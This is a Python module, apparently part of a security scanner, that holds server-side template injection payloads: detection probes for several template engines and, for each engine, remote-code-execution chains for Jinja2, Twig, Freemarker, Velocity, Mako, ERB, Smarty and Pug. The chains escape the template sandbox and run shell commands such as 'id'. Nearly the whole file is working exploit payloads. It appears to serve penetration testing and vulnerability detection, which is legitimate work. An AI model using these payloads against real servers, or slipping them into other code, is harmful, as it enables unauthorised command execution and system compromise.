"""Server-Side Template Injection payloads."""

# Detection probes — each has (payload, expected_output) for verification
# Oracle confirms by checking if response contains str(eval(expr))
SSTI_PROBES = [
    # Math expression — output should be "49"
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{7*7}", "49"),
    # Jinja2-specific
    ("{{7*'7'}}", "7777777"),
    # Mako
    ("${7*7}mako", "49mako"),
    # Smarty
    ("{$smarty.version}", "smarty"),
    # Twig
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "exec"),
    # Freemarker
    ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid="),
    # Pebble
    ("{% for i in range(3) %}{{ i }}{% endfor %}", "012"),
]

# Per-engine RCE chains (used after engine is confirmed)
SSTI_ENGINES = {
    "jinja2": [
        # Classic Jinja2 sandbox escape
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.class.mro()[1].subclasses()[408]('id', shell=True, stdout=-1).communicate()[0].strip()}}",
        # Alternative
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{'id'|filter}}",
        "{{['id']|filter('system')}}",
    ],
    "freemarker": [
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ],
    "velocity": [
        "#set($str=$class.inspect('java.lang.String').type)#set($chr=$class.inspect('java.lang.Character').type)#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= system('id') %>",
    ],
    "smarty": [
        "{system('id')}",
        "{php}echo `id`;{/php}",
    ],
    "pug": [
        "- var x = require('child_process').execSync('id').toString()\n= x",
    ],
}
